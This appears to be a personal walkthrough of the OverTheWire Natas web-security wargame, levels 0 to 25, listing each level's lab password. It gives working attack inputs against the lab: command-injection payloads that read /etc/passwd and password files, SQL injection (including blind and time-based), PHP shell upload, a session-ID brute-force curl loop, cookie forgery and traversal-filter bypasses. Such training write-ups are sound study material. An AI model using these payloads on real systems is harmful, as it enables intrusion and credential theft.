# Natas

By Brendan Weibrecht

http://natasX.natas.labs.overthewire.org/

## 0

View page source

	<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->

gtVrDuiDfck831PqWsLEZy5gyDz1clto

## 1

View page source

	<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## 2

	<img src="files/pixel.png">

The image is useless, but shows there is a `files` directory. Loading this up shows a directory listing revealing another file called `users.txt`, that has contents:

	# username:password
	alice:BYNdCesZqW
	bob:jw2ueICLvT
	charlie:G5vCxkVV3m
	natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
	eve:zo4mJWyNj2
	mallory:9urtcpzBmH

sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

## 3

	<!-- No more information leaks!! Not even Google will find it this time... -->

This hints about Google search indexing.

Checking for `robots.txt`:

	User-agent: *
	Disallow: /s3cr3t/

This reveals that there is a `s3cr3t` folder. Loading that shows a directory listing revealing a file called `users.txt`, that has contents:

	natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## 4

> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

This hints about requiring a specific referrer URL. natas5 asks for HTTP auth, but if we cancel that, it does give us a page. We can modify the DOM to add a link to natas4:

	<a href="http://natas4.natas.labs.overthewire.org/">natas4</a>

This link then presents the required referrer URL, and we are shown:

> Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## 5

http://natas5.natas.labs.overthewire.org/

> Access disallowed. You are not logged in

I was stuck on this one for a while and had to look up a hint =(

COOKIES! Argh, I didn't think to check that. That was the key to how we solved a challenge in CySCA 2014, so I'm not too fussed about spoiling this one.

Changing the `loggedin` cookie's value to `1` presents us with:

> Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## 6

We are presented with an input box with prompt "Input secret". There's a "View sourcecode" link which reveals some PHP embedded in the page's source:

```html
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a>
```

This reveals that the value of $secret is set in the file `includes/secret.inc`. Loading this URL reveals the secret:

```html
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submitting this in the input box shows:

> Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## 7

Two links to other pages are shown:

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
```

`/index.php?page=home` shows:

```html
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Hmm. Perhaps the page variable is referencing a filename. We must need supply a relative path to `/etc/natas_webpass/natas8`.

Ha, nope =P `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` shows the password.

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

## 8

Another embedded PHP page with "View sourcecode" link.

```html
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a>
```

So it seems that `$secret` is passed through base64, then strrev, and bin2hex. So to decode the string `3d3d516343746d4d6d6c315669563362`, each operation needs to be undone in reverse order.

### 1. Undo bin2hex

	3d3d516343746d4d6d6c315669563362

It looks like the PHP function `hex2bin()` can be used to undo `bin2hex()`.

Running:

	echo hex2bin("3d3d516343746d4d6d6c315669563362");

in [an online PHP sandbox](http://sandbox.onlinephpfunctions.com/) shows:

	==QcCtmMml1ViV3b

### 2. Undo strrev

Running:

	echo strrev("==QcCtmMml1ViV3b");

shows:

	b3ViV1lmMmtCcQ==

### 3. Undo base64

Running:

	echo base64_decode("b3ViV1lmMmtCcQ==");

shows:

	oubWYf2kBq

### Using the secret

Submitting the secret shows:

> Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## 9

Source:

```html
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a>
```

Uh oh! This is interpolating an input into a system call; this should be fun XP

Grep uses regex, so using `.` we can return every line in a file. Hash can comment out the ` dictionary.txt` ending of the command.

`. /etc/passwd # ` shows all the users.

Going by the password path shown in natas7:

`. /etc/natas_webpass/natas9 # ` shows the current password.
`. /etc/natas_webpass/natas10 # ` shows the next password!

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## 10

Same as before, but now our input is filtered using `preg_match('/[;|&]/',$key)` to prevent chaining commands.

This probably still lets subshells though though =P

`. /etc/natas_webpass/natas11 # ` shows the next pasword; haha, no need for a subshell.

U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

## 11

a - \#FFFFFF:

	ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D

b - \#000000:

	ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D

Convert each:

- Decode from URI
- Decode from Base64
- Convert to hex

A - \#FFFFFF:

	0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 19 57 68 5d 55 5a 2d 12 18 54 25 03 55 02 68 52 11 5e 2c 17 11 5e 68 0c

B - \#000000:

	0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 19 57 68 5d 55 5a 2d 12 18 54 25 03 55 02 68 52 47 08 7a 41 47 08 68 0c

Together for comparison:

	0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 19 57 68 5d 55 5a 2d 12 18 54 25 03 55 02 68 52 11 5e 2c 17 11 5e 68 0c
	0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 19 57 68 5d 55 5a 2d 12 18 54 25 03 55 02 68 52 47 08 7a 41 47 08 68 0c

Comparing shows that these parts differ:

	11 5e 2c 17 11 5e
	47 08 7a 41 47 08

That indicates that those sections are the six characters of colour that was input.

XORing those with the plaintext (you only need to do A or B, but both are shown for completeness):

A - \#FFFFFF:

Note that the PHP script converts the input to lowercase - uppercase character values are different!

	1: 11 5e 2c 17 11 5e	# ciphertext A: ^,^
	2: 66 66 66 66 66 66	# plaintext A: ffffff
	=  77 38 4a 71 77 38	# key: w8Jqw8

B - \#000000:

	1: 47 08 7a 41 47 08	# ciphertext B: "G\bzAG\b"
	2: 30 30 30 30 30 30	# plaintext B: 000000
	=  77 38 4a 71 77 38	# key: w8Jqw8

It looks like the key is repeating here given that `w8` appears at the start and the end of this section, so it's four characters long.

In order to decipher the whole cookie, we need to work out what the key starts with.

We can see from the PHP source code that the cookie data is stored in JSON, so the first characters of the plaintext must be `{"`.

	1: 0a 55	# ciphertext
	2: 7b 22	# plaintext: {"
	=  71 77    # key: qw

If the key starts with `qw`, then by looking at that repeating section, it must be `qw8J`.

The cookie we want to decipher is 41 characters long, so let's repeat the key for 41 characters:

	qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq

Now to XOR that key string with the full cookie ciphertext:

	1. ciphertext A: 0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 19 57 68 5d 55 5a 2d 12 18 54 25 03 55 02 68 52 11 5e 2c 17 11 5e 68 0c
	2. key:          71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71
	=  plaintext:    7b 22 73 68 6f 77 70 61 73 73 77 6f 72 64 22 3a 22 6e 6f 22 2c 22 62 67 63 6f 6c 6f 72 22 3a 22 23 66 66 66 66 66 66 22 7d
	=  ascii:        {"showpassword":"no","bgcolor":"#ffffff"}

Great, so now we just need to create a XOR'd, base64'd and URI'd cookie with `showpassword` set to `yes`.

Starting with:
	
	{"showpassword":"yes","bgcolor":"#ffffff"}

XOR that with a 42 character key: `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw`

	1. plaintext:  7b 22 73 68 6f 77 70 61 73 73 77 6f 72 64 22 3a 22 79 65 73 22 2c 22 62 67 63 6f 6c 6f 72 22 3a 22 23 66 66 66 66 66 66 22 7d
	2. key:        71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77 38 4a 71 77
	3. ciphertext: 0a 55 4b 22 1e 00 48 2b 02 04 4f 25 03 13 1a 70 53 0e 5d 39 53 5b 1a 28 16 14 57 26 1e 05 1a 70 53 54 5e 2c 17 11 5e 2c 53 0a

Great, now base64 the ciphertext:

	b = Base64.encode64(x.to_byte_string).gsub("\n",'')
	ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Well, no need to run that through `URI.escape b, '='` since there aren't any equals characters.

Setting that as the cookie now reveals the password on the page.

EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## 12

There is no file extension validation, so change the extension of the filename input to `.php`

Uploading a test PHP file shows that it does indeed run.

PHP exec() works, so I created a basic REPL so I wouldn't have to upload the script before running each attempt.

	cat /etc/natas_webpass/natas13

jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## 13

exif_imagetype() checks the first few bytes to verify that the file is an image. We can just add a few bytes to the start of our script that indicate it is an image. One way is just to add `BMP`!

Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## 14

The source indicates a classic SQL injection vulnerability. Entering `" or 1=1 -- ` as the username logs in successfully.

AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

## 15

Whilst this is vulnerable to SQL injection, there is only a boolean output (blind SQL injection). We can use a regular expression to match the password in the form:

	natas16" AND password REGEXP BINARY '#{regex}' -- 

When it responds that the user exists, then the password matches the regex.

I have written a script that extracts each character individually - to do so, it repeatedly selects the matching half of the remaining possible character set.

Running the script extracts the full password in about two minutes:

WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

## 16

A subshell can still be called using `$()`, but I can't use pipes, quotes, or ampersands. I can still use I/O redirection though.

Given that I can't curl from port 8000 on a domain I have, I'm assuming that network connections are blocked.

The output of the subshell is inserted into the grep command inside its quotes.

Grep is being used as case insensitive, so even if I can extract each character separately and search for it, I'd have to check many combinations of case. Not to mention that some of the characters are digits (i.e. the first one!) and so won't have results in the dictionary file.

	$(mkdir /tmp/zimbix-natas16)
	$(cat /etc/natas_webpass/natas17 > /tmp/zimbix-natas16/natas17)
	$(chmod 777 /tmp/zimbix-natas16/natas17)

Then using my PHP shell from level 12 and 13, run:

	cat /tmp/zimbix-natas16/file

8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

## 17

Very similar to level 15 (content-based blind SQLi), except this time there are no responses. We will have to use sleeps for checks (time-based blind SQLi).

Todo: Load the previous Ruby script, and monkey-patch / rewrite to be more modular.

	natas18" AND password REGEXP BINARY '^.*$' AND SLEEP(5) -- 

....

xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

## 18

Try every session ID

	for i in `seq 0 641`; do; curl 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/index.php?debug' -b PHPSESSID=$i -s | grep -2 'The credentials for the next level are:'; echo $i; done

ID = 46 did it! XP

4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

## 19

''
''
3633322d

'a'
''
3430382d61
3136392d61

3236332d61646d696e
34362d61646d696e

3534372d
3338392d
3439332d
3436322d
3434302d
3134302d
3539392d
3530362d
37352d		"75-"

The second half of the cookie is the username in hex. The first half ranges from "01-" to "640-" (assuming ranges are exactly the same as before). Password appears to do nothing to change the session id

Got it at:
381-admin
3338312d61646d696e

eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

## 20

Session data is stored in a file with one line per key pair, and a space between the key and value. We can use `%0A` to insert a newline and put `admin 1` on the next line.

Load:

http://natas20.natas.labs.overthewire.org/index.php?debug&name=derp%0Aadmin%201

and then on the next page load, we will be admin.

IFekPyrQXftziDEsUr3x21sYuahypdgJ

## 21

The two sites being colocated means they can share sessions. The experimenter site sets any request variables in the session, so we can simply include a value for admin:

http://natas21-experimenter.natas.labs.overthewire.org/?debug&submit&admin=1

Now use this session id cookie on the other site.

chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

## 22

The password will be revealed if we simply include a `revelio` GET variable. If this is set however, we'll be redirected away using a header `Location` value. Since the page will contain the password, we can just curl the page content to avoid the redirect:

curl 'http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org/index.php?revelio'

D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

## 23

This checks the `passwd` variable for a substring and an integer comparison. In PHP, converting strings to numbers simply stops reading the string after the number part finishes.

http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou

OsRmXFguozKpTZZ5X14zNO43379LZveg

## 24

According to the PHP manual, `strcmp` does weird things when it's given non-string values.

Adding `[]` to the end of a GET variable passes an array!

http://natas24.natas.labs.overthewire.org/?passwd[]=

GHF6X7YwACaYYssHVY05cFq83hRktl4c

## 25

To bypass the `../` replacement, we can use `..././` or `....//` since it takes out the middle one and leaves what we want.

To bypass the second check for `natas_webpass`, we can use a symbollic link. Using the shell from level 12 and 13, run:

	mkdir /tmp/zimbix-26
	ln -s /etc/natas_webpass/natas26 /tmp/zimbix-26/link
	chmod 777 /tmp/zimbix-26

Now to get to:

	/tmp/zimbix-26/link

From the (assumed) current directory:

	/var/www/natas/natas12/language/

We want:

	../../../../../tmp/zimbix-26/link

So let's try:

	....//....//....//....//....//tmp/zimbix-26/link

oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

## 26

